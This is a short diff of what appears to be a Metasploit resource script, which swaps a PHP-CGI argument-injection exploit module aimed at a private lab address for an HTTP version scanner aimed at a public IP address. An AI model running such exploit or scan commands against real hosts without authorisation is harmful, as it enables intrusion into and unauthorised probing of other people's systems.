@@ -1,4 +1,4 @@
-use exploit/multi/http/php_cgi_arg_injection
-set RHOST 10.10.38.170
+use auxiliary/scanner/http/http_version
+set RHOST 99.83.179.177
 run
 exit
